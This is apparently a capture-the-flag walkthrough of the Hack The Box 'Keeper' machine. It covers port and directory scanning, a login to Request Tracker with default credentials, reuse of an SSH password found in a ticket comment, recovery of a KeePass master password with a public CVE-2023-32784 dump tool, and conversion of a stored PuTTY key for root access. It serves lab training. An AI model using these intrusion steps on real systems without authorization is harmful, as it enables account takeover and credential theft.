# Keeper - Easy

```sh
sudo vim /etc/hosts
# add keeper.htb

nmap -T4 -p- -A -Pn -v keeper.htb
```

* Open ports & services:

    * 22/tcp - ssh - OpenSSH 8.9p1 Ubuntu 3ubuntu0.3
    * 80/tcp - http - nginx 1.18.0

* On port 80, we have a webpage whiich gives us the subdomain <tickets.keeper.htb> for raising an IT support ticket:

    ```sh
    sudo vim /etc/hosts
    # map tickets.keeper.htb as well
    ```

* This subdomain leads us to <http://tickets.keeper.htb/rt/> - it is running 'Request Tracker' software from 'Best Practical Solutions'; we can also see the version details in the footer text as '4.4.4+dfsg-2ubuntu1'

* Googling for exploits associated with Request Tracker version 4.4.4 does not give us a lot of info, so we can continue basic enumeration

* Directory scan:

    ```sh
    feroxbuster -u http://keeper.htb -w /usr/share/dirb/wordlists/common.txt -x php,html,bak,bac,md,jpg,png,ps1,js,txt,json,docx,pdf,zip,cgi,sh,pl,aspx,sql,xml --extract-links --scan-limit 2 --filter-status 400,401,404,405,500 --silent
    # directory enumeration

    # starting with a smaller wordlist, we can then go for medium-sized wordlists if needed
    feroxbuster -u http://keeper.htb -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,html,bak,bac,md,jpg,png,ps1,js,txt,json,docx,pdf,zip,cgi,sh,pl,aspx,sql,xml --extract-links --scan-limit 2 --filter-status 400,401,404,405,500 --silent

    # directory enumeration for tickets.keeper.htb
    feroxbuster -u http://tickets.keeper.htb -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,html,bak,bac,md,jpg,png,ps1,js,txt,json,docx,pdf,zip,cgi,sh,pl,aspx,sql,xml --extract-links --scan-limit 2 --filter-status 400,401,404,405,500 --silent
    ```

* While the directory scan takes place, we can check with default credentials; Googling for 'Request Tracker default credentials' gives us 'root:password' - this works for logging into <http://tickets.keeper.htb>

* From the dashboard view, we can see a ticket opened by requestor "webmaster@keeper.htb" and user "lnorgaard (Lise Nørgaard)" - it is about 'Issue with Keepass Client on Windows'; further enumeration gives us another user "root (Enoch Root)"

* Checking the ticket history, it shows that there was a crashdump of the keepass program, but the attachment was removed later

* Enumerating the dashboard further, under the 'Admin' section, we can check user info for both users

* For 'lnorgaard', the comments section mentions the password 'Welcome2023!' - we can check for password re-use via SSH:

    ```sh
    ssh lnorgaard@keeper.htb
    # SSH using password re-use works

    ls -la
    # get user flag

    # we also have a zip file here
    ls -la RT30000.zip
    ```

* The zip file could be the Keepass crashdump mentioned earlier - we can download it to the attacker machine:

    ```sh
    # in attacker machine
    scp lnorgaard@keeper.htb:/home/lnorgaard/RT30000.zip .
    
    unzip RT30000.zip
    # we have 2 files
    # a packet capture 'KeePassDumpFull.dmp'
    # and a Keepass file 'passcodes.kdbx'

    # to view the kdbx file, we need keepassx
    sudo apt install keepassx

    # we can try opening the .kdbx file now, but it needs a password

    # cracking kdbx file
    keepass2john passcodes.kdbx > kdbx_hash

    john --wordlist=/usr/share/wordlists/rockyou.txt kdbx_hash
    # unable to crack the hash
    ```

* We are unable to crack the hash for the '.kdbx' file; however we have not taken a look at the crash dump:

    ```sh
    file KeePassDumpFull.dmp
    # Mini DuMP crash report
    ```

* Googling for Keepass crash dump analysis leads us to CVE-2023-32784, which is a vulnerability for KeePass versions lower than 2.54 - it allows us to dump the master password from KeePass's memory

* As we already have a '.dmp' file, we can try using [one of the exploits on GitHub for CVE-2023-32784](https://github.com/dawnl3ss/CVE-2023-32784):

    ```sh
    python3 CVE-2023-32784.py KeePassDumpFull.dmp
    # gives a lot of possible passwords like "●ldgr●d med fl●de", "●Idgr●d med fl●de"
    ```

* The exploit gives us various possible passwords, but a lot of characters seem similar - it seems a few characters are not clear

* Googling for the various strings itself gives us results for 'Rødgrød Med Fløde', a Danish dessert - this seems to be the password for the '.kdbx' file too, but in lowercase

* Using the password string "rødgrød med fløde", we are able to open the '.kdbx' file using ```keepassxc``` software

* Inside the database, under the 'Network' section, we have password 'F4><3K0nd!' for user "root", and the Notes section also includes the contents of a key file

* The key is for ```PuTTY```, as the first header is 'PuTTY-User-Key-File-3: ssh-rsa' - this is for '.ppk' files or PuTTY keys; it also includes 'Public-Lines' and 'Private-Lines', so we need to [convert them from PuTTY to OpenSSH format](https://www.baeldung.com/linux/ssh-key-types-convert-ppk):

    ```sh
    vim root.ppk
    # paste the key contents to putty key file

    # extract private key
    puttygen root.ppk -O private-openssh -o id_rsa

    chmod 600 id_rsa

    ssh root@keeper.htb -i id_rsa
    # this works and we are able to login as root

    ls -la /root
    # get root flag
    ```
